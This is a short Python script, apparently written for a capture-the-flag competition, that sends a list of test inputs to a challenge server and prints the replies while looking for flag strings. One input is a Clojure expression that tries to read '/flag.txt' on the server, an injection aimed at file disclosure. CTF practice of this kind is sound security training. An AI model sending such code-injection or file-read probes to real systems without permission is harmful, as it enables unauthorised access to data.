#!/usr/bin/env python3
import socket
import time

def quick_test(payload, timeout=2):
    try:
        s = socket.socket()
        s.settimeout(timeout)
        s.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3005))
        s.sendall(payload.encode())
        s.shutdown(socket.SHUT_WR)
        
        data = s.recv(1024)  # Just get first 1KB
        s.close()
        return data.decode(errors='replace')
    except Exception as e:
        return f"Error: {e}"

# Quick tests
tests = [
    ("Empty", ""),
    ("Just newline", "\n"),
    ("slurp flag", "(slurp \"/flag.txt\")\n"),
    ("EOF char", "\x04"),
    ("Ctrl-C", "\x03"),
    ("Ctrl-D", "\x04"),
    ("exit", "exit\n"),
    ("quit", "quit\n"),
    (":exit", ":exit\n"),
    ("(System/exit 0)", "(System/exit 0)\n"),
]

for name, payload in tests:
    print(f"\n{'='*50}")
    print(f"Test: {name}")
    print(f"Payload: {repr(payload)}")
    result = quick_test(payload)
    print(f"Result ({len(result)} bytes):")
    print(result[:200])
    
    # Check for flags
    if 'uscc{' in result.lower() or 'flag{' in result.lower():
        print("\n🚩 POSSIBLE FLAG FOUND!")
        print(result)
